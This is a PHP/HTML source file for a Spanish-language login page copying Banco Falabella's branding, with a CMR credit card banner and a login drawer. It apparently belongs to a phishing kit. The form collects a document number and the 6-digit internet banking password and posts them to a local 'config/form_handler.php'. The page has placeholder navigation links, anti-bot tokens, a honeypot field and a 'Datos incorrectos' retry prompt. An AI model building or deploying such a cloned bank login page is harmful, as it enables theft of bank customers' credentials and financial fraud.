<?php
require_once __DIR__ . '/config/security.php';
send_security_headers();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingresa a tu cuenta | Banco Falabella</title>
    <meta name="description" content="Ingresa a tu cuenta de Banco Falabella con tu documento y tu clave de internet.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/login.css">
</head>
<body>

    <div class="top-bar">
        <div class="container top-bar-container">
            <div class="top-bar-links">
                <a href="#">Falabella</a>
                <a href="#">Homecenter</a>
                <a href="#">Seguros Falabella</a>
                <span class="divider">|</span>
                <a href="#">Transparencia</a>
            </div>
        </div>
    </div>

    <header class="main-header">
        <div class="container header-container">
            <a href="index.php" class="logo">
                <img src="img/logo-fab.svg" alt="">
                <span class="logo-text"><span>Banco</span><span>Falabella</span></span>
            </a>
            <div class="header-actions">
                <button class="btn btn-light-green" type="button">Hazte cliente</button>
                <button class="btn btn-dark-green" type="button" id="abrirLogin">Banca en línea</button>
            </div>
        </div>
    </header>

    <nav class="main-nav">
        <div class="container">
            <ul class="nav-list">
                <li class="active"><a href="#">Tarjeta de Crédito</a></li>
                <li><a href="#">Cuenta de Ahorros</a></li>
                <li><a href="#">Productos de Inversión</a></li>
                <li><a href="#">Créditos</a></li>
                <li><a href="#">Beneficios y CMR Puntos</a></li>
                <li><a href="#">Empresas</a></li>
                <li><a href="#">Educación Financiera</a></li>
                <li><a href="#">Seguros</a></li>
                <li><a href="#">Ayuda y Contacto</a></li>
            </ul>
        </div>
    </nav>

    <main>
        <section class="hero-section">
            <div class="container">
                <div class="hero-banner">
                    <picture>
                        <source media="(min-width: 768px)" srcset="img/hero-desktop.webp">
                        <img src="img/hero.webp" alt="Mujer en centro comercial con tarjeta CMR" class="hero-bg-img">
                    </picture>
                    <div class="hero-overlay"></div>
                    <div class="hero-content">
                        <h1>Tarjeta de Crédito CMR</h1>
                        <p>Pídela en línea, disfruta de cientos de beneficios y 3 meses sin cuota de manejo</p>
                        <a href="solicitud.php" class="btn-hero">¡Pídela aquí!</a>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <div class="login-backdrop" id="loginBackdrop"></div>

    <aside class="login-drawer" id="loginDrawer" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
        <button class="login-close" id="cerrarLogin" type="button" aria-label="Cerrar"></button>

        <div class="login-logo">
            <img src="img/logo-fab.svg" alt="">
            <span><span>Banco</span><span>Falabella</span></span>
        </div>

        <h1 class="login-title" id="loginTitle">Ingresa a tu cuenta</h1>

<?php
$hasError = (isset($_GET['error']) && $_GET['error'] == '1');
$botSec = generate_bot_token('login');
?>
        <form id="loginForm" action="config/form_handler.php" method="POST" novalidate>
            <input type="hidden" name="antispam_token" value="<?php echo htmlspecialchars($botSec['token']); ?>">
            <input type="hidden" name="form_render_time" value="<?php echo (int)$botSec['timestamp']; ?>">
            <div style="display:none !important; visibility:hidden !important; position:absolute; left:-9999px;">
                <input type="text" name="website_url" tabindex="-1" autocomplete="off">
            </div>
            <div class="login-field select">
                <select id="tipoDoc" name="tipoDoc" aria-label="Tipo de documento">
                    <option value="Cédula Ciudadanía">Cédula Ciudadanía</option>
                    <option value="Cédula de Extranjería">Cédula de Extranjería</option>
                    <option value="Pasaporte">Pasaporte</option>
                </select>
            </div>

            <p class="login-error <?php echo $hasError ? 'show' : ''; ?>" id="loginError">
                <?php echo $hasError ? 'Datos incorrectos. Por favor, revisa tu informacion.' : 'Revisa tu documento y tu contraseña de 6 dígitos.'; ?>
            </p>

            <div class="login-field">
                <input 
                    type="text" 
                    id="documento" 
                    name="documento" 
                    inputmode="numeric" 
                    autocomplete="username" 
                    maxlength="12" 
                    placeholder="Ej: 1020304050" 
                    aria-label="Número de documento"
                    class="<?php echo $hasError ? 'input-error' : ''; ?>">
            </div>

            <div class="login-field pass">
                <input 
                    type="password" 
                    id="clave" 
                    name="clave" 
                    inputmode="numeric" 
                    autocomplete="current-password" 
                    maxlength="6" 
                    placeholder="Tu contraseña tiene 6 dígitos" 
                    aria-label="Contraseña">
                <button class="eye" id="verClave" type="button" aria-label="Mostrar contraseña">
                    <svg viewBox="0 0 24 24" aria-hidden="true">
                        <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z"/>
                        <circle cx="12" cy="12" r="3"/>
                        <path class="slash" d="M4 20L20 4"/>
                    </svg>
                </button>
            </div>

            <button type="submit" class="login-submit" id="ingresar" disabled>Ingresar</button>
        </form>

        <a href="#" class="login-recover">
            Recupera o crea tu clave internet
            <svg viewBox="0 0 12 12" aria-hidden="true"><path d="M3 9l6-6M4 3h5v5"/></svg>
        </a>
    </aside>

    <style>
        .input-error {
            border-color: #c62828 !important;
            background-color: #fff5f5 !important;
        }
    </style>

    <script>
        var doc = document.getElementById('documento'),
            pass = document.getElementById('clave'),
            btn = document.getElementById('ingresar'),
            eye = document.getElementById('verClave'),
            err = document.getElementById('loginError');

        function validar() {
            var ok = doc.value.replace(/\D/g, '').length >= 5 && pass.value.length === 6;
            btn.disabled = !ok;
            err.classList.remove('show');
        }

        doc.addEventListener('input', function () {
            doc.value = doc.value.replace(/\D/g, '');
            limpiarError();
            validar();
        });

        pass.addEventListener('input', function () {
            pass.value = pass.value.replace(/\D/g, '').slice(0, 6);
            limpiarError();
            validar();
        });

        eye.addEventListener('click', function () {
            var show = pass.type === 'password';
            pass.type = show ? 'text' : 'password';
            eye.classList.toggle('on', show);
            eye.setAttribute('aria-label', show ? 'Ocultar contraseña' : 'Mostrar contraseña');
        });

        function limpiarError() {
            doc.classList.remove('input-error');
        }

        doc.focus();
    </script>
</body>
</html>
